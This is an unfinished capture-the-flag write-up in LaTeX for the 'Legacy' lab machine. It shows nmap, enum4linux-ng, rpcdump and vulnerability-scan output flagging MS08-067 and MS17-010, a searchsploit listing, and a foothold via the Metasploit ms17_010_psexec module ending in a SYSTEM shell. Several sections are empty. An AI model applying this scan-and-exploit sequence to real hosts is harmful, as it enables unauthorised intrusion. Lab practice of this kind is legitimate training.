\chapter{Legacy}
\begin{itemize}
    \item {\bf technics}: ethernalblue, MS17-010 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sC -sV -oX legacy.xml 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 04:44 CEST
Nmap scan report for 10.10.10.4
Host is up (0.097s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:3a:0c (VMware)
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-10-13T07:42:23+03:00

\end{verbatim}

\subsubsection{smb}

\begin{verbatim}
$ enum4linux-ng -A -u anonymous -p anonymous 10.10.10.4
ENUM4LINUX - next generation
 =========================================================
|    NetBIOS Names and Workgroup/Domain for 10.10.10.4    |
 =========================================================
[+] Got domain/workgroup name: HTB
[+] Full NetBIOS names information:
- LEGACY          <00> -         B <ACTIVE>  Workstation Service
- HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- LEGACY          <20> -         B <ACTIVE>  File Server Service
- HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
- HTB             <1d> -         B <ACTIVE>  Master Browser
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
- MAC Address = 00-50-56-B9-3A-0C

=======================================
|    SMB Dialect Check on 10.10.10.4    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true

 =============================================
|    OS Information via RPC for 10.10.10.4    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 5.1
OS version: '5.1'
OS release: not supported
OS build: not supported
Native OS: Windows 5.1
Native LAN manager: Windows 2000 LAN Manager
Platform id: null
Server type: null
Server type string: null
\end{verbatim}

Du SMB 1.0

\subsubsection{msrpc}
\begin{verbatim}
$ rpcdump.py  10.10.10.4
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.4
[-] Protocol failed: rpc_s_access_denied
[*] No endpoints found.
\end{verbatim}

\subsubsection{Vuln scan}

\begin{verbatim}
 sudo nmap -sV --script vuln  10.10.10.4

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
\end{verbatim}


\begin{verbatim}
$ searchsploit --nmap legacy.xml |grep remote
Microsoft Windows 2000/NT 4 - RPC Locator Service Remote Overflow                | windows/remote/5.c
Microsoft Windows - DCOM RPC Interface Buffer Overrun                            | windows/remote/22917.txt
Microsoft Windows - DNS RPC Remote Buffer Overflow (2)                           | windows/remote/3746.txt
Microsoft Windows - 'Lsasrv.dll' RPC Remote Buffer Overflow (MS04-011)           | windows/remote/293.c
Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) (1)   | windows/remote/4745.cpp
Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) (2)   | windows/remote/4934.c
Microsoft Windows - 'RPC2' Universal / Denial of Service (RPC3) (MS03-039)       | windows/remote/109.c
Microsoft Windows - 'RPC DCOM2' Remote (MS03-039)                                | windows/remote/103.c
Microsoft Windows - 'RPC DCOM' Long Filename Overflow (MS03-026)                 | windows/remote/100.c
Microsoft Windows - 'RPC DCOM' Remote (1)                                        | windows/remote/69.c
Microsoft Windows - 'RPC DCOM' Remote (2)                                        | windows/remote/70.c
Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow                            | windows/remote/64.c
Microsoft Windows - 'RPC DCOM' Remote (Universal)                                | windows/remote/76.c
Microsoft Windows - 'RPC DCOM' Scanner (MS03-039)                                | windows/remote/97.c
Microsoft Windows Server 2000 SP4 - DNS RPC Remote Buffer Overflow               | windows/remote/3737.py
Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)                         | windows/remote/66.c
Microsoft Windows XP/2000 - RPC Remote Non Exec Memory                           | windows/remote/117.c
\end{verbatim}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
msf6 exploit(windows/smb/ms17_010_psexec) 

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


